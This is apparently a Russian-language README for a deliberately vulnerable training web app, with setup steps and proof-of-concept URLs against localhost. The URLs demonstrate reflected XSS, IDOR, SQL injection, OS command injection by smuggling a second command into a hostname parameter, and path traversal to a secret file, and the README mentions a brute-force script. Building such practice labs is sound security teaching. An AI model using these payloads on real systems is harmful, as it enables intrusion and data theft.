# Задание №1 v1 Уязвимая версия приложения
[v2](https://github.com/ptichkin0/Task1_2)


### Инструкция по сборке и запуску приложения

1. Установка зависимостей:

   ```
   pip install -r requirements.txt
   ```

2. Создание файлов для тестов:

   ```
   python create_files.py
   ```
   
3. Запуск сервера:

   ```
   python server.py
   ```
   
### Proof of Concept

XSS:
>Классический пример простого отраженного межсайтового скриптинга.
```
 http://127.0.0.1:5000/xss?input=<script>alert('XSS')</script>
```
IDOR:
>Какой id введешь, в такой профиль польльзователя и попадешь
```
http://127.0.0.1:5000/profile/1
http://127.0.0.1:5000/profile/2
```
SQL Injection:
>Классический пример SQL инъекции. Возможен некорректный вывод, если не запускали create_files.py для создания бд
```
http://127.0.0.1:5000/search?input=' OR '1'='1'
```

OS Command Injection:
>Выполнение консольных команд на примере Windows
```
http://127.0.0.1:5000/ping?hostname=localhost | dir
http://127.0.0.1:5000/ping?hostname=localhost & dir
```

Path Traversal:
>Можно прочитать любой txt файл. (secret.txt создается скриптом create_files.py)
```
http://127.0.0.1:5000/file?filename=./secret.txt
http://127.0.0.1:5000/file?filename=./requirements.txt
```
Brute Force Attack:
>Вовремя работы server.py запустить брутфорс
```
python bruteforce.py
```
